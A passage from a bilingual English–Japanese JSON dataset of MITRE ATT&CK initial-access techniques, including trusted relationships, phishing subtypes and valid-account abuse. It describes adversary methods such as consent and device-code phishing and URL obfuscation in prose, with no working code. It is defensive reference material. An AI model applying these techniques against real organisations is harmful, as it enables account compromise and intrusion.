                "description_jp": "攻撃者は、意図した被害者にアクセスできる組織を侵害したり、その他の方法で利用したりする可能性があります。信頼できる第三者関係を介したアクセスは、保護されていない可能性のある、またはネットワークへのアクセスを取得する標準的なメカニズムよりも精査が少ない既存の接続を悪用します。\n\n組織は、内部システムやクラウドベースの環境を管理できるようにするために、セカンドパーティまたはサードパーティの外部プロバイダーに昇格されたアクセス権を付与することがよくあります。これらの関係の例としては、ITサービス請負業者、マネージドセキュリティプロバイダー、インフラストラクチャ請負業者（HVAC、エレベーター、物理セキュリティなど）があります。サードパーティプロバイダーのアクセスは、維持されているインフラストラクチャに限定されることを意図している場合がありますが、企業の他の部分と同じネットワーク上に存在する可能性があります。そのため、内部ネットワークシステムへのアクセスに相手方が使用する[有効なアカウント](https://attack.mitre.org/techniques/T1078)が侵害され、使用される可能性があります。(引用: CISA IT Service Providers)\n\nOffice 365環境では、組織はMicrosoftパートナーまたはリセラーに委任管理者権限を付与する場合があります。パートナーまたはリセラーアカウントを侵害することにより、攻撃者は既存の委任管理者関係を利用したり、クライアントに新しい委任管理者オファーを送信したりして、被害者テナントに対する管理制御を取得できる可能性があります。(引用: Office 365 Delegated Administration)",
                "subtechniques": []
            },
            {
                "id": "T1566",
                "name_eng": "Phishing",
                "name_jp": "フィッシング",
                "description_eng": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce) or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\").(Citation: phishing-krebs)\n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "description_jp": "攻撃者は、被害者のシステムへのアクセスを得るためにフィッシングメッセージを送信する可能性があります。あらゆる形態のフィッシングは、電子的に配信されるソーシャルエンジニアリングです。フィッシングは標的型（スピアフィッシングと呼ばれる）にすることができます。スピアフィッシングでは、特定の個人、企業、または業界が攻撃者の標的となります。より一般的には、攻撃者は大量のマルウェアスパムキャンペーンなどで、非標的型のフィッシングを実行できます。\n\n敵対者は、悪意のある添付ファイルやリンクを含むメールを被害者に送信し、通常は被害者のシステム上で悪意のあるコードを実行させようとします。フィッシングは、ソーシャルメディアプラットフォームなどのサードパーティサービスを介して行われることもあります。フィッシングには、信頼できる情報源になりすましたり、メッセージ送信に悪用されている侵害されたアカウントからのメールやメタデータ/ヘッダーを削除または操作したりする（例：[メール隠蔽ルール](https://attack.mitre.org/techniques/T1564/008)）などのソーシャルエンジニアリング技術や回避技術も含まれる場合があります。(引用: Microsoft OAuth Spam 2022)(引用: Palo Alto Unit 42 VBA Infostealer 2014) これを達成する別の方法は、送信者のIDを[メールスプーフィング](https://attack.mitre.org/techniques/T1672)することです。(引用: Proofpoint-spoof) これは、人間の受信者と自動化されたセキュリティツールの両方を騙すために使用できます。(引用: cyberproof-double-bounce) あるいは、悪意のあるファイルやリンクを含む既存のメールスレッドに意図したターゲットを当事者として含めることもあります（すなわち、「スレッドハイジャック」）。(引用: phishing-krebs)\n\n被害者はまた、悪意のあるURLへのアクセス、マルウェアのダウンロード(引用：sygnia Luna Month)(引用：CISA Remote Monitoring and Management Software)、または攻撃者がアクセス可能なリモート管理ツールを自分のコンピュータにインストールする(すなわち、[ユーザー実行](https://attack.mitre.org/techniques/T1204))ように指示される電話番号に電話するように指示するフィッシングメッセージを受信するかもしれない。(引用：Unit42 Luna Moth)",
                "subtechniques": [
                    {
                        "id": "T1566.002",
                        "name_eng": "Spearphishing Link",
                        "name_jp": "スピアフィッシングリンク",
                        "description_eng": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nAdversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through “consent phishing” into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",
                        "description_jp": "攻撃者は、被害者のシステムへのアクセスを取得しようとして、悪意のあるリンク付きのスピアフィッシングメールを送信する可能性があります。リンク付きスピアフィッシングは、スピアフィッシングの特定の亜種です。これは、メールに悪意のあるファイルを添付する代わりに、メールに含まれるマルウェアをダウンロードするためのリンクを使用するという点で、他の形式のスピアフィッシングとは異なります。これにより、メールの添付ファイルを検査する可能性のある防御を回避します。スピアフィッシングには、信頼できる情報源になりすますなどのソーシャルエンジニアリング技術も含まれる場合があります。\n\nあらゆる形態のスピアフィッシングは、特定の個人、企業、または業界を標的とした、電子的に配信されるソーシャルエンジニアリングです。このシナリオでは、悪意のあるメールにリンクが含まれています。一般的に、リンクにはソーシャルエンジニアリングのテキストが付随しており、ユーザーが積極的にクリックしたり、URLをブラウザにコピーして貼り付けたりする必要があります（[ユーザー実行](https://attack.mitre.org/techniques/T1204)を利用）。訪問したWebサイトは、エクスプロイトを使用してWebブラウザを侵害するか、最初にメールの口実に応じて、ユーザーにアプリケーション、ドキュメント、zipファイル、さらには実行可能ファイルのダウンロードを促します。\n\n攻撃者はまた、エンドシステムを直接悪用することを目的とした埋め込み画像など、メールリーダーと直接対話することを目的としたリンクを含める可能性があります。さらに、攻撃者は、正当なウェブサイトを模倣するために特殊文字を悪用する一見無害なリンクを使用する可能性があります（「IDNホモグラフ攻撃」として知られています）。(引用：CISA IDN ST05-016) URLはまた、整数ベースまたは16進数ベースのホスト名形式の受け入れや、「@」記号の前のテキストの自動破棄など、URLスキーマの癖を利用して難読化される可能性があります。例：<code>hxxp://google.com@1157586937</code>。(引用：Mandiant URL Obfuscation 2023)\n\n敵対者はまた、スピアフィッシングリンクを利用して、ユーザーが受け入れると悪意のあるアプリケーションに権限/アクセスを付与するOAuth 2.0リクエストURLなど、同意フィッシングを実行するために[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)を行う可能性があります。(引用：Trend Micro Pawn Storm OAuth 2017) これらの盗まれたアクセストークンにより、敵対者はAPI呼び出しを介してユーザーに代わってさまざまなアクションを実行できます。(引用：Microsoft OAuth 2.0 Consent Phishing 2021)\n\n敵対者はまた、スピアフィッシングリンクを利用して、被害者環境への即時アクセスを許可する[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)を行う可能性があります。例えば、ユーザーは「同意フィッシング」によって誘い込まれ、悪意のあるOAuth 2.0リクエストURLを介して敵対者に権限/アクセスを付与する可能性があります。(引用：Trend Micro Pawn Storm OAuth 2017)(引用：Microsoft OAuth 2.0 Consent Phishing 2021)\n\n同様に、悪意のあるリンクは、通常UI/ブラウザなしでデバイスを認証するために使用されるOAuth 2.0デバイス認証許可フローなど、デバイスベースの認証を標的にする可能性があります。「デバイスコードフィッシング」として知られており、攻撃者は被害者を悪意のある認証ページに誘導するリンクを送信し、そこでユーザーはデバイスコード/資格情報を入力するように騙され、デバイストークンが生成されます。(引用: SecureWorks Device Code Phishing 2021)(引用: Netskope Device Code Phishing 2021)(引用: Optiv Device Code Phishing 2021)"
                    },
                    {
                        "id": "T1566.001",
                        "name_eng": "Spearphishing Attachment",
                        "name_jp": "スピアフィッシング添付ファイル",
                        "description_eng": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
                        "description_jp": "攻撃者は、被害者のシステムへのアクセスを取得しようとして、悪意のある添付ファイル付きのスピアフィッシングメールを送信する可能性があります。スピアフィッシング添付ファイルは、スピアフィッシングの特定の亜種です。スピアフィッシング添付ファイルは、メールにマルウェアを添付するという点で、他の形式のスピアフィッシングとは異なります。あらゆる形態のスピアフィッシングは、特定の個人、企業、または業界を標的とした、電子的に配信されるソーシャルエンジニアリングです。このシナリオでは、攻撃者はスピアフィッシングメールにファイルを添付し、通常、実行を得るために[ユーザー実行](https://attack.mitre.org/techniques/T1204)に依存します。(引用: Unit 42 DarkHydrus July 2018) スピアフィッシングには、信頼できる情報源になりすますなどのソーシャルエンジニアリング技術も含まれる場合があります。\n\n添付ファイルには、Microsoft Officeドキュメント、実行可能ファイル、PDF、アーカイブファイルなど、多くのオプションがあります。添付ファイルを開くと（そして潜在的に保護をバイパスしてクリックすると）、攻撃者のペイロードが脆弱性を悪用するか、ユーザーのシステムで直接実行されます。スピアフィッシングメールの本文は通常、ファイルを開くべきもっともらしい理由を提示しようとし、そうするためにシステムの保護をバイパスする方法を説明する場合があります。メールにはまた、メール境界防御を回避するために、zipファイルのパスワードなど、添付ファイルを復号化する方法に関する指示が含まれている場合があります。攻撃者は、添付された実行可能ファイルをドキュメントファイルに見せかけたり、あるアプリケーションを悪用するファイルを別のアプリケーションのファイルに見せかけたりするために、ファイル拡張子やアイコンを頻繁に操作します。"
                    },
                    {
                        "id": "T1566.004",
                        "name_eng": "Spearphishing Voice",
                        "name_jp": "スピアフィッシングボイス",
                        "description_eng": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Tools](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)\n\nAdversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)",
                        "description_jp": "攻撃者は、最終的に被害者のシステムへのアクセスを取得するために音声通信を使用する可能性があります。音声によるスピアフィッシングは、スピアフィッシングの特定の亜種です。これは、電話やその他の音声通信形態を通じてユーザーを操作してシステムへのアクセスを提供させるという点で、他の形態のスピアフィッシングとは異なります。スピアフィッシングには、信頼できる情報源になりすましたり（例：[なりすまし](https://attack.mitre.org/techniques/T1656)）、受信者に緊急性や警戒感を抱かせたりするなど、ソーシャルエンジニアリング技術が頻繁に関与します。\n\nあらゆる形態のフィッシングは、電子的に配信されるソーシャルエンジニアリングです。このシナリオでは、攻撃者はマルウェアを被害者に直接送信するのではなく、配信と実行のために[ユーザー実行](https://attack.mitre.org/techniques/T1204)に依存しています。例えば、被害者は、悪意のあるURLへのアクセス、マルウェアのダウンロード(引用：sygnia Luna Month)(引用：CISA Remote Monitoring and Management Software)、または攻撃者がアクセス可能なリモート管理ツール([リモートアクセスツール](https://attack.mitre.org/techniques/T1219))を自分のコンピュータにインストールするように指示される電話番号に電話するように指示するフィッシングメッセージを受信する可能性があります。(引用：Unit42 Luna Moth)\n\n攻撃者はまた、音声フィッシングと[多要素認証リクエスト生成](https://attack.mitre.org/techniques/T1621)を組み合わせて、ユーザーを騙してMFA資格情報を漏洩させたり、認証プロンプトを受け入れさせたりする可能性があります。(引用: Proofpoint Vishing)"
                    },
                    {
                        "id": "T1566.003",
                        "name_eng": "Spearphishing via Service",
                        "name_jp": "サービス経由のスピアフィッシング",
                        "description_eng": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
                        "description_jp": "攻撃者は、被害者のシステムへのアクセスを取得しようとして、サードパーティサービスを介してスピアフィッシングメッセージを送信する可能性があります。サービスを介したスピアフィッシングは、スピアフィッシングの特定の亜種です。これは、企業の電子メールチャネルを直接介するのではなく、サードパーティサービスを使用するという点で、他の形式のスピアフィッシングとは異なります。\n\nあらゆる形態のスピアフィッシングは、特定の個人、企業、または業界を標的とした、電子的に配信されるソーシャルエンジニアリングです。このシナリオでは、攻撃者はさまざまなソーシャルメディアサービス、個人のウェブメール、およびその他の企業が管理していないサービスを介してメッセージを送信します。(引用: Lookout Dark Caracal Jan 2018) これらのサービスは、企業よりもセキュリティポリシーが緩い可能性が高くなります。ほとんどの種類のスピアフィッシングと同様に、目標はターゲットとの信頼関係を築いたり、何らかの方法でターゲットの関心を引いたりすることです。攻撃者は偽のソーシャルメディアアカウントを作成し、潜在的な求人機会について従業員にメッセージを送信します。そうすることで、環境で実行されているサービス、ポリシー、ソフトウェアについて尋ねるもっともらしい理由が得られます。その後、攻撃者はこれらのサービスを介して悪意のあるリンクまたは添付ファイルを送信できます。\n\n一般的な例としては、ソーシャルメディアを介してターゲットと信頼関係を築き、その後、ターゲットが職場のコンピュータで使用している個人のウェブメールサービスにコンテンツを送信することが挙げられます。これにより、攻撃者は職場のアカウントのメール制限の一部を回避でき、ターゲットは期待していたものであるため、ファイルを開く可能性が高くなります。ペイロードが期待どおりに機能しない場合、攻撃者は通常の通信を継続し、ターゲットと協力して機能させる方法をトラブルシューティングできます。"
                    }
                ]
            },
            {
                "id": "T1078",
                "name_eng": "Valid Accounts",
                "name_jp": "有効なアカウント",
                "description_eng": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、既存のアカウントの資格情報を取得して悪用する可能性があります。侵害された資格情報は、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、ネットワークデバイス、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。(引用: volexity_0day_sophos_FW) 侵害された資格情報は、攻撃者に特定のシステムに対する権限の昇格や、ネットワークの制限された領域へのアクセスを許可する可能性もあります。攻撃者は、これらの資格情報が提供する正当なアクセスと組み合わせてマルウェアやツールを使用しないことを選択し、その存在を検出することをより困難にする場合があります。\n\n場合によっては、攻撃者は非アクティブなアカウントを悪用することがあります。例えば、組織の一員ではなくなった個人に属するアカウントなどです。これらのアカウントを使用すると、元のアカウントユーザーが自分のアカウントで行われている異常なアクティビティを特定するために存在しないため、攻撃者は検出を回避できる可能性があります。(引用: CISA MFA PrintNightmare)\n\nシステムのネットワーク全体にわたるローカル、ドメイン、およびクラウドアカウントの権限の重複は懸念事項です。なぜなら、攻撃者はアカウントやシステムをまたいでピボットし、高レベルのアクセス（つまり、ドメインまたはエンタープライズ管理者）に到達して、エンタープライズ内で設定されたアクセス制御をバイパスできる可能性があるためです。(引用: TechNet Credential Theft)",
                "subtechniques": [
                    {
                        "id": "T1078.004",
                        "name_eng": "Cloud Accounts",
                        "name_jp": "クラウドアカウント",
                        "description_eng": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",
                        "description_jp": "クラウド環境の有効なアカウントにより、攻撃者は初期アクセス、永続化、権限昇格、または防御回避を達成するためのアクションを実行できる可能性があります。クラウドアカウントとは、ユーザー、リモートサポート、サービス、またはクラウドサービスプロバイダーやSaaSアプリケーション内のリソースの管理のために組織によって作成および構成されたものです。クラウドアカウントはクラウド内にのみ存在することも、Windows Active Directoryなどの他のIDソースとの同期またはフェデレーションを通じてオンプレミスシステムとクラウド間でハイブリッド結合することもできます。(引用: AWS Identity Federation)(引用: Google Federating GC)(引用: Microsoft Deploying AD Federation)\n\nサービスアカウントまたはユーザーアカウントは、[ブルートフォース](https://attack.mitre.org/techniques/T1110)、[フィッシング](https://attack.mitre.org/techniques/T1566)、またはその他のさまざまな手段を通じて攻撃者の標的となり、環境へのアクセスを取得する可能性があります。フェデレーションまたは同期されたアカウントは、攻撃者がオンプレミスシステムとクラウド環境の両方に影響を与える経路となる可能性があります。たとえば、共有資格情報を利用して[リモートサービス](https://attack.mitre.org/techniques/T1021)にログオンするなどです。フェデレーション、同期、またはクラウド専用であるかどうかにかかわらず、特権の高いクラウドアカウントは、ハイブリッド結合されたデバイスでコマンドを実行するためにSaaSベースの[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)を利用することにより、オンプレミス環境へのピボットを可能にする場合もあります。\n\n攻撃者は、環境内での永続性を維持するために、侵害されたクラウドアカウントに長期間有効な[追加のクラウド資格情報](https://attack.mitre.org/techniques/T1098/001)を作成する可能性があります。このような資格情報は、多要素認証などのセキュリティ制御をバイパスするためにも使用される場合があります。\n\nクラウドアカウントはまた、環境内のさまざまな手段を通じて[一時的な昇格されたクラウドアクセス](https://attack.mitre.org/techniques/T1548/005)またはその他の権限を取得できる場合もあります。ロールの割り当てまたはロールの引き受けポリシーの誤構成により、攻撃者はこれらのメカニズムを使用して、アカウントの意図された範囲外の権限を利用できる可能性があります。このような過剰な特権を持つアカウントは、[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)またはその他の方法を通じて、オンラインストレージアカウントおよびデータベースから機密データを収集するために使用される場合があります。たとえば、Azure環境では、攻撃者は関連するAzureリソースがアクセストークンを要求できるようにするAzure Managed Identitiesを標的にする可能性があります。Azure VMなどの管理対象IDがアタッチされたリソースを侵害することにより、攻撃者は[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)を行い、クラウド環境全体を横断的に移動できる可能性があります。(引用: SpecterOps Managed Identity 2022)"
                    },
                    {
                        "id": "T1078.002",
                        "name_eng": "Domain Accounts",
                        "name_jp": "ドメインアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",
                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、ドメインアカウントの資格情報を取得して悪用する可能性があります。(引用: TechNet Credential Theft) ドメインアカウントとは、Active Directoryドメインサービスによって管理され、そのドメインの一部であるシステムおよびサービス全体でアクセスと権限が構成されるものです。ドメインアカウントには、ユーザー、管理者、およびサービスが含まれます。(引用: Microsoft AD Accounts)\n\n攻撃者は、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)やパスワードの再利用など、さまざまな手段を通じて、一部は高レベルの特権を持つドメインアカウントを侵害し、ドメインの特権リソースへのアクセスを許可する可能性があります。"
                    },
                    {
                        "id": "T1078.003",
                        "name_eng": "Local Accounts",
                        "name_jp": "ローカルアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、ローカルアカウントの資格情報を取得して悪用する可能性があります。ローカルアカウントとは、ユーザー、リモートサポート、サービス、または単一のシステムやサービスの管理のために組織によって構成されたものです。\n\nローカルアカウントは、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)を通じて権限を昇格させたり、資格情報を収集したりするために悪用されることもあります。パスワードの再利用により、権限昇格や横方向の移動を目的として、ネットワーク上の一連のマシンでローカルアカウントが悪用される可能性があります。"
                    },
                    {
                        "id": "T1078.001",
                        "name_eng": "Default Accounts",
                        "name_jp": "デフォルトアカウント",
                        "description_eng": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)",
                        "description_jp": "攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、デフォルトアカウントの資格情報を取得して悪用する可能性があります。デフォルトアカウントとは、WindowsシステムのゲストアカウントやAdministratorアカウントなど、OSに組み込まれているアカウントです。デフォルトアカウントには、AWSのルートユーザーアカウント、ESXiのルートユーザーアカウント、Kubernetesのデフォルトサービスアカウントなど、他の種類のシステム、ソフトウェア、またはデバイスのデフォルトの工場出荷時/プロバイダー設定アカウントも含まれます。(引用: Microsoft Local Accounts Feb 2019)(引用: AWS Root User)(引用: Threat Matrix for Kubernetes)\n\nデフォルトアカウントはクライアントマシンに限定されません。むしろ、内部、オープンソース、または商用であるかどうかにかかわらず、ネットワークデバイスやコンピュータアプリケーションなどの機器にあらかじめ設定されているアカウントも含まれます。ユーザー名とパスワードの組み合わせがあらかじめ設定されているアプライアンスは、インストール後に変更しない組織にとっては攻撃者の格好の標的となるため、深刻な脅威となります。同様に、攻撃者は、[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモート環境に正当に接続するために、公に開示された、または盗まれた[秘密キー](https://attack.mitre.org/techniques/T1552/004)または資格情報資料を利用することもあります。(引用: Metasploit SSH Module)\n\nデフォルトアカウントは、別のアプリケーションに接続または統合することにより、初期設定後にシステム上に作成される場合があります。例えば、ESXiサーバーがvCenterサーバーに接続されると、ESXiサーバー上に`vpxuser`というデフォルトの特権アカウントが作成されます。脅威アクターがこのアカウントの資格情報を侵害できた場合（例えば、vCenterホスト上の[資格情報アクセスのための悪用](https://attack.mitre.org/techniques/T1212)を介して）、ESXiサーバーにアクセスできるようになります。(引用: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(引用: Pentera vCenter Information Disclosure)"
                    }
                ]
            },
            {
                "id": "T1200",
                "name_eng": "Hardware Additions",
                "name_jp": "ハードウェア追加",
